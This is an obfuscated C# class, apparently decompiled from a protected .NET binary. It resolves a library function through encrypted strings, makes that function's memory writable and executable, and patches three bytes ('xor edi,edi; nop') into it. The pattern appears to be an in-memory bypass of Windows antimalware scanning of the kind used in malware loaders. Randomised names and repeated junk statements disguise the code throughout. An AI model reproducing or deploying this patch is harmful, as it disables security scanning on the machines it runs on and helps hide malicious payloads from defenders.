using System;
using System.Runtime.InteropServices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace WEoqBCtavg;

public static class OaxMwRDNZwo
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string string_0);

	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr wnrsFGERHOUDu, UIntPtr wcFaNpREvIICy, uint vPZAuEifQN, out uint rhnJKznbVRNQVr);

	[DllImport("Kernel32.dll")]
	private static extern void RtlMoveMemory(IntPtr intptr_0, IntPtr intptr_1, int int_0);

	public static int SiplbbVSgZOoAR()
	{
		string string_ = TwRTxDxfshC.czGbdVLSgBt(getString_0(107367778));
		string string_2 = TwRTxDxfshC.czGbdVLSgBt(getString_0(107367729));
		_ = getString_0(107367700) + getString_0(107367700) + getString_0(107367700) + getString_0(107367700) + getString_0(107367655) + getString_0(107367642) + getString_0(107368077) + getString_0(107368077) + getString_0(107368077) + getString_0(107368064) + getString_0(107367987) + getString_0(107367974) + getString_0(107367929) + getString_0(107367929) + getString_0(107367929);
		IntPtr intPtr = LoadLibrary(string_);
		_ = getString_0(107367700) + getString_0(107367700) + getString_0(107367700) + getString_0(107367700) + getString_0(107367655) + getString_0(107367642) + getString_0(107368077) + getString_0(107368077) + getString_0(107368077) + getString_0(107368064) + getString_0(107367987) + getString_0(107367974) + getString_0(107367929) + getString_0(107367929) + getString_0(107367929);
		if (intPtr == IntPtr.Zero)
		{
			return 1;
		}
		IntPtr procAddress = GetProcAddress(intPtr, string_2);
		_ = getString_0(107367700) + getString_0(107367700) + getString_0(107367700) + getString_0(107367700) + getString_0(107367655) + getString_0(107367642) + getString_0(107368077) + getString_0(107368077) + getString_0(107368077) + getString_0(107368064) + getString_0(107367987) + getString_0(107367974) + getString_0(107367929) + getString_0(107367929) + getString_0(107367929);
		if (procAddress == IntPtr.Zero)
		{
			return 1;
		}
		UIntPtr wcFaNpREvIICy = (UIntPtr)5u;
		uint rhnJKznbVRNQVr = 0u;
		_ = getString_0(107367700) + getString_0(107367700) + getString_0(107367700) + getString_0(107367700) + getString_0(107367655) + getString_0(107367642) + getString_0(107368077) + getString_0(107368077) + getString_0(107368077) + getString_0(107368064) + getString_0(107367987) + getString_0(107367974) + getString_0(107367929) + getString_0(107367929) + getString_0(107367929);
		if (!VirtualProtect(procAddress, wcFaNpREvIICy, 64u, out rhnJKznbVRNQVr))
		{
			return 1;
		}
		byte[] source = new byte[3] { 49, 255, 144 };
		_ = getString_0(107367700) + getString_0(107367700) + getString_0(107367700) + getString_0(107367700) + getString_0(107367655) + getString_0(107367642) + getString_0(107368077) + getString_0(107368077) + getString_0(107368077) + getString_0(107368064) + getString_0(107367987) + getString_0(107367974) + getString_0(107367929) + getString_0(107367929) + getString_0(107367929);
		IntPtr intPtr2 = Marshal.AllocHGlobal(3);
		_ = getString_0(107367700) + getString_0(107367700) + getString_0(107367700) + getString_0(107367700) + getString_0(107367655) + getString_0(107367642) + getString_0(107368077) + getString_0(107368077) + getString_0(107368077) + getString_0(107368064) + getString_0(107367987) + getString_0(107367974) + getString_0(107367929) + getString_0(107367929) + getString_0(107367929);
		Marshal.Copy(source, 0, intPtr2, 3);
		_ = getString_0(107367700) + getString_0(107367700) + getString_0(107367700) + getString_0(107367700) + getString_0(107367655) + getString_0(107367642) + getString_0(107368077) + getString_0(107368077) + getString_0(107368077) + getString_0(107368064) + getString_0(107367987) + getString_0(107367974) + getString_0(107367929) + getString_0(107367929) + getString_0(107367929);
		RtlMoveMemory(procAddress + 27, intPtr2, 3);
		return 0;
	}

	static OaxMwRDNZwo()
	{
		Strings.CreateGetStringDelegate(typeof(OaxMwRDNZwo));
	}
}
